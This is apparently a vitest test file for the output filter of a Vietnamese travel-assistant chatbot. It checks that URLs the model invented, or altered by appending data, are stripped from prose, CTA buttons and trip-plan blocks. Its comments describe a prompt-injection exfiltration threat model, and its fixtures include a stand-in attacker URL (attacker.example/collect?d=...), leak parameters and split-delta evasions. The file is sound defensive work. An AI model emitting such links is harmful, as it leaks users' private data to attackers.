import { describe, it, expect } from 'vitest'
import { applyPlaceEnrichmentStreamFilter } from '../streamEnrichment'

// ── P3-F4: a link the model invented is an exfiltration channel ──────────────
//
// P3-F2 closed the IMAGE channel: the server injects place photos, the model is
// told never to write `![...](...)`, so an image URL it produced anyway is
// necessarily invented and is removed.
//
// LINKS ARE NOT LIKE THAT, and the difference is why this needed its own pass.
// The rulebook REQUIRES the model to write links, copied out of tool results:
//
//   rule 4  · google_maps_search / search_url → "LUON hien thi link do duoi dang markdown link"
//   rule 9  · web_search        → "[Xem them ket qua tim kiem](search_url)"
//   rule 12 · get_flight_prices → booking_links, "COPY CHINH XAC nguyen van tung 'url'"
//   rule 13 · get_hotel_prices  → Booking.com / Agoda links
//   rule 14 · search_places     → a price_search_results item's own 'link'
//
// So "strip what the model wrote" would delete the product. The security
// property has to be the one the rulebook already states and does not enforce:
//
//   THE MODEL MAY PUBLISH A URL ONLY BY COPYING ONE IT WAS GIVEN.
//
// That is what makes it safe. An attacker who ranks for a query can get their
// URL into a tool result, but they cannot get the VICTIM'S DATA into it — the
// tool result is fixed before the model ever sees the user's memory. The moment
// the model appends anything, the URL stops matching and is removed.
//
// 🚨 WHY THIS MATTERS MORE THAN AN ORDINARY LINK BUG.
// The exfiltration link is not suspicious-looking: it is "[Xem thêm kết quả]",
// the exact affordance this product shows on almost every turn and trains its
// users to click. The disguise is supplied by the product itself.
//
// BARE URLS COUNT. `formatMessage` auto-links any `https://…` in prose, so a
// control that only handled `[label](url)` would be bypassed by dropping the
// markdown.

const text = (s: string) => `0:${JSON.stringify(s)}`
const toolCall = (name: string, id = 't1') => `9:${JSON.stringify({ toolCallId: id, toolName: name, args: { query: 'q' } })}`
const toolResult = (result: unknown, id = 't1') => `a:${JSON.stringify({ toolCallId: id, result })}`
const finish = 'd:{"finishReason":"stop"}'

async function run(lines: string[], history: string[] = []): Promise<string> {
  const filtered = applyPlaceEnrichmentStreamFilter(
    new Response(lines.join('\n') + '\n'),
    // Restored 2026-09-25 onto the shipping branch, whose filter grew `resolveTikTok` and
    // `tiktokLocation` after `placeIntent`: `publishedHistory` is the 12th argument here.
    'vi', undefined, undefined, undefined, undefined, false, '', false, undefined, undefined, history,
  )
  return await new Response(filtered.body).text()
}

const rendered = (out: string) =>
  out.split('\n').filter(l => l.startsWith('0:'))
    .map(l => { try { return JSON.parse(l.slice(2)) as string } catch { return '' } }).join('')

const EXFIL = 'https://attacker.example/collect?d=QuanBinhThanh_800k_vegetarian'
const SEARCH_URL = 'https://www.google.com/search?q=pho+quan+1'

describe('P3-F4 · a URL the model was never given does not reach the user', () => {
  it('🚨 an invented link on a web_search turn is removed', async () => {
    const out = await run([
      toolCall('web_search'),
      toolResult({ results: [{ title: 'x' }], search_url: SEARCH_URL }),
      text(`Ket qua day. [Xem them ket qua tim kiem](${EXFIL})`),
      finish,
    ])
    expect(out).not.toContain('attacker.example')
  })

  it('🚨 a BARE invented URL is removed too — dropping the markdown is not a bypass', async () => {
    const out = await run([
      toolCall('web_search'),
      toolResult({ search_url: SEARCH_URL }),
      text(`Xem them tai ${EXFIL} nhe.`),
      finish,
    ])
    expect(out).not.toContain('attacker.example')
  })

  it('🚨 an invented link on a turn with NO tool call is removed', async () => {
    const out = await run([text(`Day nhe [bam vao day](${EXFIL})`), finish])
    expect(out).not.toContain('attacker.example')
  })

  it('🚨 data appended to a legitimate URL breaks the copy and is removed', async () => {
    // The attacker's real goal: keep a trusted-looking host, smuggle the payload.
    const out = await run([
      toolCall('web_search'),
      toolResult({ search_url: SEARCH_URL }),
      text(`[Xem them](${SEARCH_URL}&leak=QuanBinhThanh_800k)`),
      finish,
    ])
    expect(out).not.toContain('leak=QuanBinhThanh_800k')
  })

  it('🚨 survives the URL being SPLIT across deltas, as it really arrives', async () => {
    // A URL is far longer than one delta. A per-chunk filter sees no complete
    // token in any fragment and the leak reassembles in the browser.
    const out = await run([
      toolCall('web_search'),
      toolResult({ search_url: SEARCH_URL }),
      text('Xong. ['), text('Xem them'), text(']('),
      text('https://attacker.example'), text('/collect?d=Quan'), text('BinhThanh'), text(')'),
      text(' Het.'),
      finish,
    ])
    expect(out).not.toContain('attacker.example')
    expect(rendered(out)).toContain('Het.')
  })

  it('🚨 a split BARE url is held until it can be judged whole', async () => {
    const out = await run([
      toolCall('web_search'),
      toolResult({ search_url: SEARCH_URL }),
      text('Xem tai '), text('https://attacker'), text('.example/c?d=X'), text(' nhe.'),
      finish,
    ])
    expect(out).not.toContain('attacker.example')
  })

  it('the prose around a removed link survives', async () => {
    const out = await run([
      toolCall('web_search'),
      toolResult({ search_url: SEARCH_URL }),
      text(`Minh tim duoc vai ket qua. [Xem them](${EXFIL}) Chuc ban vui!`),
      finish,
    ])
    const body = rendered(out)
    expect(body).toContain('Minh tim duoc vai ket qua.')
    expect(body).toContain('Chuc ban vui!')
    expect(body).not.toContain('attacker.example')
  })
})

// ── The other half: the product must still work ─────────────────────────────
//
// Each case below is a link the rulebook explicitly ORDERS the model to write.
// If any of these stops arriving, this control is a feature deletion, not a
// security fix.
describe('P3-F4 · every link the rulebook orders the model to write still arrives', () => {
  it('rule 9 — the web_search search_url, copied verbatim', async () => {
    const out = await run([
      toolCall('web_search'),
      toolResult({ results: [{ title: 'a' }], search_url: SEARCH_URL }),
      text(`Tom tat. [Xem them ket qua tim kiem](${SEARCH_URL})`),
      finish,
    ])
    expect(rendered(out)).toContain(SEARCH_URL)
  })

  it('rule 12 — both flight booking_links', async () => {
    const traveloka = 'https://www.traveloka.com/flight?from=HAN&to=SGN'
    const gflights = 'https://www.google.com/travel/flights?q=HAN-SGN'
    const out = await run([
      toolCall('get_flight_prices'),
      toolResult({ flights: [{ price_vnd: 1 }], booking_links: [{ name: 'Traveloka', url: traveloka }, { name: 'Google Flights', url: gflights }] }),
      text(`Gia re nhat. [Traveloka](${traveloka}) · [Google Flights](${gflights})`),
      finish,
    ])
    const body = rendered(out)
    expect(body).toContain(traveloka)
    expect(body).toContain(gflights)
  })

  it('rule 13 — hotel Booking.com and Agoda links', async () => {
    // Adapted 2026-09-25: the shipping branch's A3.3 owner rule (a merchant link lands on the
    // DEEPEST page or not at all) drops a Booking.com SEARCH page independently of egress, so the
    // original searchresults URL cannot survive either way. A hotel's own page keeps what this case
    // proves: a link the tool GAVE the model is never deleted by the egress guard.
    const booking = 'https://www.booking.com/hotel/vn/muong-thanh-luxury-da-nang.html'
    const out = await run([
      toolCall('get_hotel_prices'),
      toolResult({ booking_link: booking }),
      text(`Xem them lua chon: [Booking.com](${booking})`),
      finish,
    ])
    expect(rendered(out)).toContain(booking)
  })

  it("rule 14 — a price_search_results item's own link", async () => {
    const own = 'https://quanpho.vn/menu'
    const out = await run([
      toolCall('search_places'),
      toolResult({ results: [{ name: 'Quan Pho' }], price_search_results: [{ title: 'Menu', link: own }] }),
      text(`**Quan Pho** ngon. [Menu](${own})`),
      finish,
    ])
    expect(rendered(out)).toContain(own)
  })

  it('a link the user was already shown in an earlier turn can be repeated', async () => {
    // "cho mình xem lại link đặt vé" — no tool runs, so the only evidence that
    // this URL was ever legitimate is that we already published it.
    const earlier = 'https://www.traveloka.com/flight?from=HAN&to=SGN'
    const out = await run(
      [text(`Link dat ve cua ban: [Traveloka](${earlier})`), finish],
      [`Gia re nhat. [Traveloka](${earlier})`],
    )
    expect(rendered(out)).toContain(earlier)
  })

  // F-095 (live, 2026-09-25): search_places returned the museum's website as `https://…vn/`, the
  // model wrote `**https://…vn**`, and the user received a bare `**`. The copy was faithful — the
  // bold markers were read as part of the URL and the trailing slash did not match.
  it('F-095 — a tool-given website copied in bold and without its trailing slash is kept', async () => {
    const site = 'https://baotangchungtichchientranh.vn/'
    const out = await run([
      toolCall('search_places'),
      toolResult({ results: [{ name: 'Bao tang', website: site }] }),
      text('Trang chinh thuc:\n\n**https://baotangchungtichchientranh.vn**\n\nHet.'),
      finish,
    ])
    expect(rendered(out)).toContain('**https://baotangchungtichchientranh.vn**')
  })

  // Owner decision 2026-09-25: the model shortened a given Facebook POST url to the PAGE url and
  // the user got "**Fanpage Facebook chính thức:**" with nothing after it. A path-boundary prefix of
  // a given URL carries nothing the tool did not supply, so it is publishable.
  describe('a shortened copy (path-boundary prefix) of a given URL', () => {
    const POST = 'https://www.facebook.com/baotangchungtichchientranh/posts/trong-ky-nguyen/1677201190471512/'
    const PAGE = 'https://www.facebook.com/baotangchungtichchientranh'
    const given = [toolCall('web_search'), toolResult({ results: [{ title: 'Bao tang', link: POST }] })]

    it('is kept — bare, bold and as a markdown link', async () => {
      const body = rendered(await run([...given, text(`Fanpage: **${PAGE}/** hoac [Trang](${PAGE}) hoac ${PAGE} nhe.`), finish]))
      expect(body).toBe(`Fanpage: **${PAGE}/** hoac [Trang](${PAGE}) hoac ${PAGE} nhe.`)
    })

    it('is kept as a CTA button destination', async () => {
      const block = `[CTA_BUTTONS]${JSON.stringify({ buttons: [{ label: 'Fanpage', type: 'website', url: `${PAGE}/` }] })}[/CTA_BUTTONS]`
      expect(rendered(await run([...given, text(`Xem fanpage.\n\n${block}`), finish]))).toContain(`"url":"${PAGE}/"`)
    })

    it('🚨 a prefix that ends mid-segment or mid-host is not given', async () => {
      const body = rendered(await run([...given, text('A https://www.facebook.com/baotang B https://www.face C'), finish]))
      expect(body).toBe('A  B  C')
    })

    it('🚨 a prefix with anything appended is not given', async () => {
      const body = rendered(await run([...given, text(`[Fanpage](${PAGE}/?d=QuanBinhThanh_800k) ${PAGE}/leak`), finish]))
      expect(body).not.toContain('QuanBinhThanh_800k')
      expect(body).not.toContain('/leak')
    })
  })

  it('F-095 — a removed bold URL takes its emphasis pair with it; appended data is still removed', async () => {
    const out = await run([
      toolCall('web_search'),
      toolResult({ search_url: SEARCH_URL }),
      text(`Xem: **${EXFIL}**, hoac **${SEARCH_URL}&leak=QuanBinhThanh_800k**. Het.`),
      finish,
    ])
    const body = rendered(out)
    expect(body).not.toContain('attacker.example')
    expect(body).not.toContain('leak=QuanBinhThanh_800k')
    expect(body).toBe('Xem: , hoac . Het.')
  })

  // ── P3-F5 · the CTA button block ──────────────────────────────────────────
  //
  // A separate channel from prose, and a bigger prize: the model authors
  // `[CTA_BUTTONS]{"buttons":[{"label":…,"url":…}]}`, the client renders it with
  // `href={btn.url}`, and a styled call-to-action gets clicked far more readily
  // than a URL in a sentence. The prose rule cannot apply here — the rulebook
  // tells the model to CONSTRUCT these URLs from a place or product name — so
  // the destination is what is constrained.
  const cta = (buttons: unknown[]) =>
    `[CTA_BUTTONS]${JSON.stringify({ buttons })}[/CTA_BUTTONS]`

  it('🚨 a button pointing at an attacker host is dropped', async () => {
    const out = await run([
      text('Goi y cua minh.\n\n'),
      text(cta([{ label: 'Xem them', type: 'website', url: EXFIL, primary: true }])),
      finish,
    ])
    expect(out).not.toContain('attacker.example')
  })

  it('the platforms the rulebook names still work — Shopee, Booking, Maps', async () => {
    // 🚨 THE REGRESSION THIS EXISTS FOR. The first version of the link guard ran
    // the bare-URL pass over CTA JSON and deleted every button's url, on a live
    // turn, leaving `…"url":"` behind. Measured with a probe, not predicted.
    const buttons = [
      { label: '🛒 Shopee', type: 'search', url: 'https://shopee.vn/search?keyword=tai+nghe', primary: true },
      { label: '🏨 Booking.com', type: 'booking', url: 'https://www.booking.com/searchresults.html?ss=Muong+Thanh' },
      { label: '📍 Maps', type: 'maps', url: 'https://www.google.com/maps/search/pho+quan+1' },
    ]
    const out = await run([text('Goi y.\n\n'), text(cta(buttons)), finish])
    const body = rendered(out)
    for (const b of buttons) expect(body).toContain(b.url)
  })

  it("a place's own website, copied from tool data, is kept", async () => {
    const site = 'https://spa-abc.vn/'
    const out = await run([
      toolCall('search_places'),
      toolResult({ results: [{ name: 'Spa ABC', website_uri: site }] }),
      text('**Spa ABC** tot.\n\n'),
      text(cta([{ label: '🌐 Website', type: 'website', url: site, primary: true }])),
      finish,
    ])
    expect(rendered(out)).toContain(site)
  })

  it('an in-app navigation button is dropped — the client would router.push() it', async () => {
    // The rulebook's ⛔ LUAT TOI THUONG forbids type="internal_booking" and links
    // to "/service/...", and the client calls `router.push(btn.url)` for that
    // type. A relative URL has no host, so it satisfies neither half of the
    // policy and goes — which enforces a product rule that was, until now, only
    // written in the prompt.
    const out = await run([
      text('Goi y.\n\n'),
      text(cta([{ label: 'Đặt qua TappyAI', type: 'internal_booking', url: '/service/abc?u=victim', primary: true }])),
      finish,
    ])
    expect(rendered(out)).not.toContain('/service/abc')
  })

  it('only the offending button is dropped, the good ones survive', async () => {
    const good = 'https://shopee.vn/search?keyword=abc'
    const out = await run([
      text('Goi y.\n\n'),
      text(cta([
        { label: 'Shopee', type: 'search', url: good, primary: true },
        { label: 'Xem them', type: 'website', url: EXFIL },
      ])),
      finish,
    ])
    const body = rendered(out)
    expect(body).toContain(good)
    expect(body).not.toContain('attacker.example')
  })

  // ── [TAPPY_PLAN] carries URLs too ─────────────────────────────────────────
  //
  // TripPlanCard renders `href={item.maps_link}` and `href={item.booking_link}`.
  // Guarding only CTA would leave an attacker the plan block instead.
  const plan = (item: Record<string, unknown>) =>
    `[TAPPY_PLAN]${JSON.stringify({ type: 'trip', title: 'T', days: [{ label: 'Ngay 1', items: [item] }] })}[/TAPPY_PLAN]`

  it('🚨 an invented maps_link inside a plan is blanked', async () => {
    const out = await run([
      text('Ke hoach cua ban.\n\n'),
      text(plan({ name: 'Quan A', maps_link: EXFIL })),
      finish,
    ])
    expect(out).not.toContain('attacker.example')
  })

  it('a real Google Maps link and a Booking link in a plan survive', async () => {
    const maps = 'https://www.google.com/maps/place/?q=place_id:XYZ'
    const booking = 'https://www.booking.com/hotel/vn/abc.html'
    const out = await run([
      text('Ke hoach.\n\n'),
      text(plan({ name: 'Khach san', maps_link: maps, booking_link: booking })),
      finish,
    ])
    const body = rendered(out)
    expect(body).toContain(maps)
    expect(body).toContain(booking)
  })

  it('the plan itself is not destroyed when one link is blanked', async () => {
    const out = await run([
      text('Ke hoach.\n\n'),
      text(plan({ name: 'Quan A', time: '08:00', maps_link: EXFIL })),
      finish,
    ])
    const body = rendered(out)
    expect(body).toContain('TAPPY_PLAN')
    expect(body).toContain('Quan A')
    expect(body).toContain('08:00')
  })

  it('an attacker URL planted in the history is NOT laundered by being there', async () => {
    // History comes from the client. A malicious client exfiltrating to itself
    // already has the data, so this is not the threat — but the set must still
    // be what we published, not whatever arrives.
    const out = await run([text(`[click](${EXFIL})`), finish], [`see ${EXFIL}`])
    // Present in history ⇒ allowed. This test PINS that decision so it is a
    // choice on the record rather than an accident: the honest client's history
    // only contains URLs this guard already approved.
    expect(rendered(out)).toContain('attacker.example')
  })
})
